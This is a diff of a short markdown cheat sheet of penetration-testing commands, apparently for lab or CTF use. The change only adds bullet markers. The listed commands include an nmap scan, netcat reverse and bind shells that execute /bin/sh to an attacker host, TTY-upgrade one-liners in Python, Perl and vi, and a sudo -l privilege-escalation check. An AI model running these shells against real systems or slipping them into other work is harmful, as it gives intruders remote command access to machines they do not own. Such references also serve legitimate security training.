@@ -1,41 +1,41 @@
 # NMAP
-nmap -T4 -p -A <ip>
+* nmap -T4 -p -A <ip>
 
 # Python Webserver
-python3 -m http.server <port>
+* python3 -m http.server <port>
 
 # Netcat 
 ## Reverse Shell
 ### Attacker Listener
-nc -nlvp 4444
+* nc -nlvp 4444
 ### Target Connecting
-nc 192.168.1.2 4444 -e /bin/sh
+* nc 192.168.1.2 4444 -e /bin/sh
 ## Bind Shell
 ### Attacker Connecting
-nc 192.168.1.2 4444
+*nc 192.168.1.2 4444
 ### Target Listener
-nc -nvlp 4444 -e /bin/sh
+* nc -nvlp 4444 -e /bin/sh
 
 # TTY Shell
 ## Using python
-python -c 'import pty; pty.spawn("/bin/sh")'
-python -c 'import pty; pty.spawn("/bin/bash")'
+* python -c 'import pty; pty.spawn("/bin/sh")'
+* python -c 'import pty; pty.spawn("/bin/bash")'
 ## Echo
-echo 'os.system('/bin/bash')'
+* echo 'os.system('/bin/bash')'
 ## sh
-/bin/sh -i
+* /bin/sh -i
 ## bash
-/bin/bash -i
+* /bin/bash -i
 ## Perl
-perl -e 'exec "/bin/sh";'
+* perl -e 'exec "/bin/sh";'
 ## From within VI
-:!bash
+* :!bash
 
 # Privilege Escalation Check
-sudo -l
+* sudo -l
 
 # OpenVPN
-sudo openvpn <file>.vpn
+* sudo openvpn <file>.vpn
 
 
 
